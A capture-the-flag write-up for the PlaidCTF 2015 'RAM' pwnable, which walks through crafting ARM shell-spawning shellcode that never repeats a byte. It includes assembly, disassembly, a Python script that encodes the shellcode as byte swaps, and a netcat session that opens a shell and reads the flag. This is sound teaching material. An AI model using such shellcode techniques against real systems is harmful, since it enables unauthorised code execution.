# PlaidCTF CTF 2015: RAM

**Category:** Pwnable
**Points:** 170
**Solves:** 31
**Description:**

> Hree is a ctue lttile selhlcdoe 
> [challenge](http://play.plaidctf.com/files/permute_33e624400463108ac96b45bc6158fa54.py) ([old version](http://play.plaidctf.com/files/permute_30b51ae3e1ce42cf57462073236b3a85.py)).
> 
> Server: 52.4.108.221 port 4444
> 
> 
> Team	Points	Submission
> fuzzi3	176	18 hours ago
> gallopsled	173	17 hours ago
> Tracer Tea	171	17 hours ago

## Write-up

First, let's break down what the supplied python file does. Here is the first relevant section:

```python
buf = map(chr, range(256))

while 1:
    a,b = map(ord, sys.stdin.read(2))
    if a == b:
        break
    buf[a], buf[b] = buf[b], buf[a]
```

The first line creates a buffer containing '\x00\x01\x02 ... \xFF'. The next loop reads pairs of bytes from the input, and swaps arbitrary bytes in the buffer based on the user input. Since stdin is user-controlled, this lets us create any arbitrary permutation of the bytes from 0 to 255.

The next section of the file creates an executable file, writes an ELF header, dumps the permuted buffer into the ELF file, and executes it. There's one little thing to make things interesting:

```python
elf += pack('<HHI', 2, 0x28, 1) # type=exec, machine=ARM, version=1
```

That's right, we're going to be writing ARM machine code. At this point the solution is obvious, all we have to do is come up with some ARM machine instructions that get a shell, with the additional constraint that it has to be some permutation on the bytes from 0 to 255. Or, equivalently, we need ARM shellcode that never uses the same byte twice.

To solve this problem you'll need to grab an ARM toolchain and a userspace emulator to run the code locally.

```
sudo apt-get install qemu-user libc6-armel-cross libc6-dev-armel-cross binutils-arm-linux-gnueabi gcc-arm-linux-gnueabi
```

Let's start with some basic code to exec a shell on ARM, and then see what modifications we need to make in order to do it without ever reusing the same byte.

```
.text
.globl _start
_start:
    mov %r7, $11
    ldr %r0, =msg
    mov %r1, $0
    mov %r2, $0
    svc 0
msg:
    .asciz "/bin/sh"
```

Build and test, then objdump the result to see what our machine code looks like.

```
arm-linux-gnueabi-gcc -o arm.exe -nostartfiles -static arm.S
qemu-arm arm.exe
$ <we have a shell> exit
arm-linux-gnueabi-objdump -d arm.exe
```
```
00008098 <_start>:
    8098:	e3a0700b 	mov	r7, #11
    809c:	e59f0010 	ldr	r0, [pc, #16]	; 80b4 <msg+0x8>
    80a0:	e3a01000 	mov	r1, #0
    80a4:	e3a02000 	mov	r2, #0
    80a8:	ef000000 	svc	0x00000000

000080ac <msg>:
    80ac:	6e69622f 	.word	0x6e69622f
    80b0:	0068732f 	.word	0x0068732f
    80b4:	000080ac 	.word	0x000080ac
```

The most obviously reused byte in there is 0, and we can immediately see that there is going to be a problem with the `svc` instruction, which has 3 of them. But this is all assuming we use the EABI; searching around the internet shows that there is an older, obsolete syscall API, which puts the syscall number in the svc instruction. The older ABI also does not use r7, so we can get rid of the first instruction. We can also replace `mov` instructions with math instructions that do the same thing, and a bit of experimentation showed that r2 was already 0, and we don't need to overwrite it.

```
00008098 <_start>:
    8098:	e59f000c 	ldr	r0, [pc, #12]	; 80ac <msg+0x8>
    809c:	e0231003 	eor	r1, r3, r3
    80a0:	ef90000b 	svc	0x0090000b

000080a4 <msg>:
    80a4:	6e69622f 	.word	0x6e69622f
    80a8:	0068732f 	.word	0x0068732f
    80ac:	000080a4 	.word	0x000080a4

```

The next major obstacle is the '/' in '/bin/sh'. We need two slashes in the filename, which means we can't send the exact filename bytes as part of the input. The code also cannot self-modify, which means we have to transfer the filename to the stack somehow. We also need to generate the trailing 0 byte because we already used one in the `svc` instruction.

Here is a cut at copying '/bin/sh' to the stack:

```
00008098 <_start>:
    8098:	e0231003 	eor	r1, r3, r3
    809c:	e28f5018 	add	r5, pc, #24
    80a0:	e8150180 	ldmda	r5, {r7, r8}
    80a4:	e24d0008 	sub	r0, sp, #8
    80a8:	e2888001 	add	r8, r8, #1
    80ac:	e9200180 	stmdb	r0!, {r7, r8}
    80b0:	e5c01007 	strb	r1, [r0, #7]
    80b4:	ef90000b 	svc	0x0090000b

000080b8 <msg>:
    80b8:	6e69622f 	.word	0x6e69622f
    80bc:	7968732e 	.word	0x7968732e

```
That introduced another zero byte, which we can weed out by simply offsetting further up the stack. We can also eliminate duplication between the low bytes of the `ldmda` and the `stmdb` by using different registers and loading/storing dummy registers at the end.

The next thing to deal with is the common `e2` prefix on many of the instructions. That instruction byte contains a condition code field, which allows for conditional execution. What we can do is choose condition codes that are always true so that the instructions get executed. If we change the `eor` to an `eors`, then the 'Z' flag will always be set, so the `le` and `ls` conditions will always be true.

The last thing is the `10` in the `strb` instruction. The 1 comes from r1, which just needs to be any register containing a zero. We can use r2 or r3 instead, because they are initialized to zero by the loader.

```
00008098 <_start>:
    8098:	e0331003 	eors	r1, r3, r3
    809c:	928f501c 	addls	r5, pc, #28
    80a0:	e8151270 	ldmda	r5, {r4, r5, r6, r9, ip}
    80a4:	d24d0f41 	suble	r0, sp, #260	; 0x104
    80a8:	e2898001 	add	r8, r9, #1
    80ac:	e9204340 	stmdb	r0!, {r6, r8, r9, lr}
    80b0:	e5c03007 	strb	r3, [r0, #7]
    80b4:	ef90000b 	svc	0x0090000b

000080b8 <msg>:
    80b8:	6e69622f 	.word	0x6e69622f
    80bc:	7968732e 	.word	0x7968732e
```

Now we have code to get a shell, and it never uses the same byte twice. To turn this into a sequence of swaps that will generate the correct permutation, we can use a small python script:

```python
buf = map(chr, range(256))

f = open("arm.exe", "r")
binary = f.read()[0x98:0xc0]  # use a hex dump of the ELF file to find the offset of the code
f.close()

f = open("permutation.bin", "w")

for i in range(len(binary)):
  ch = binary[i]
  found = False
  for swap in range(i, 256):
    if buf[swap] == ch:
      found = True
      if i != swap:
        print "swapping", i, swap, ord(ch), hex(ord(ch))
        f.write(chr(i))
        f.write(chr(swap))
        buf[i], buf[swap] = buf[swap], buf[i]
  if not found:
    print "could not find character", ord(ch), hex(ord(ch))
    exit(1)

f.write(chr(0))
f.write(chr(0))
f.close()
```

Now we have a file containing the correct permutation. Send it to the server, but keep standard input connected to the terminal, so we can run commands in the shell we created.

```
$ cat permutation.bin - | nc 52.4.108.221 4444
ls
flag.txt
permute.py
submit
cat flag.txt
flag{shellcode_with_the_colors_of_the_rainbow_db43044f}
```

## Other write-ups and resources

* <https://neg9.org/news/2015/4/26/plaidctf-2015-ram-pwnable-170-writeup> 
